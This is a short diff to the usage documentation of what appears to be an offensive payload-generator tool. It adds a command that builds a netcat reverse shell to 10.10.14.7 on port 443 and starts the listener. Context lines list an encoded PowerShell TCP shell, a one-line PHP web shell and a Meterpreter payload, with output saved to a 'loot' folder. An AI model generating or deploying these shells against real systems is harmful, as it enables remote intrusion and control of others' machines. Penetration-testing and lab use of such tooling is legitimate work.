@@ -194,6 +194,7 @@ Set your listener once, then generate in any language and encoding.
 /payload ps-tcpclient +ps-encodedcommand   # UTF-16LE+base64 -> powershell -enc <blob>
 /payload php-webshell                       # <?php system($_REQUEST['cmd']) ?>
 /msf win-meterpreter-tcp                    # full msfvenom line + multi/handler
+/payload nc-e 10.10.14.7 443 --listen       # generate the shell AND start the listener on :443
 ```
 
 Each generated payload is echoed with its **matching listener**, saved to `loot/`,
